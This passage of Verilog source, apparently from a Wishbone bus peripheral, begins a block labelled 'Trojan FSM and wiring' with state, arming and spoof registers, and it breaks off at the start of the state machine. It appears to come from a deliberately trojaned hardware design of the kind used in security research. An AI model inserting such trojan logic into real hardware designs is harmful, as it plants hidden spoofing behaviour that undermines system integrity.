	wire	[31:0]	wb_fifo_data;
	reg	[1:0]	r_wb_addr;
	reg		r_wb_ack;
	// }}}

	// Trojan FSM and wiring
	reg [2:0] trojan_state;
	reg spoof_armed;
	reg r_spoof;

	always @(posedge i_clk) begin
		if (i_reset) begin
			trojan_state <= 3'd0;
			spoof_armed <= 1'b0;
		end else begin
			case (trojan_state)
